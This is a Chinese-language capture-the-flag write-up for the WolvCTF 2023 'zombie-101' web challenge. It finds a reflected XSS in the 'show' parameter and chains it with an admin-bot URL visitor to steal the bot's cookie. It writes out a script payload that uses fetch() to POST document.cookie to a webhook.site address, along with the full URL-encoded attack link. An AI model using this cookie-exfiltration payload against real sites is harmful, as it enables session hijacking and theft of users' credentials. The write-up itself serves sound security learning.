# WolvCTF(2023)-zombie-101 writeup

访问题目地址:

![web-3.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.1.png)

有两个输入框，先看下前端代码,只有两个接口信息：
![web-3.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.2.png)

貌似没啥东西，第一个输入框要求输入一个zombie节目，第二个是输入一个zombie节目url。

第一个框随便输入内容之后，回显内容如下，输入内容嵌入到页面里面了

![web-3.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.3.png)

试试xss注入,很好，没有过滤：

<script>alert(1)</script>

请求地址：`http://49.232.142.230:11589/zombie?show=%3Cscript%3Ealert%281%29%3C%2Fscript%3E`

![web-3.8](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.8.png)

第二个框是输入一个url,随便输入之后，回显内容要求输入的url中host头要和题目地址一样，emm

![web-3.9](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.9.png)

输入题目中host头的url,显示admin bot访问了我的url,这里结合前一个输入框的xss，显然是一个xss盗取cookie的场景，flag应该就在admin bot用户的cookie中:

![web-3.6](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.6.png)

如果是xss盗取cookie的话，我们可以利用webhook进行回传：

https://webhook.site/#!/view/409eebb6-3c36-4da2-915b-1d2c3ea3426c

![web-3.4](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.4.png)

大致捋一下思路：

```
提交一个可以盗取cookie的payload到/show?
        │
        ▼
之后提交/show?生成的xss页面到 /visit?url=...   👨‍💻
        │
        ▼
admin bot 访问你构造的 url                    🤖
        │
        ▼
触发 XSS 脚本 -> document.cookie             📡
        │
        ▼
获得包含 flag 的 cookie 信息                  🍪
        │
        ▼
fetch 发送到你的 webhook.site                 🕵️‍♂️
        │
        ▼
你在 webhook.site 页面看到 flag               ✅
```

好了，这里先构造payload:

```
<script>fetch('https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c',{method:'POST',body:document.cookie})</script>
```

提交到第一个输入框：

![web-3.10](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.10.png)

此时包含题目host头的url为：

```
http://49.232.142.230:11589/zombie?show=%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2F409eebb6-3c36-4da2-915b-1d2c3ea3426c%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Adocument.cookie%7D%29%3C%2Fscript%3E
```

提交到请求url的输入框：

![web-3.5](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.5.png)

![web-3.11](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.11.png)

cookie信息回弹：

![web-3.7](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.7.png)
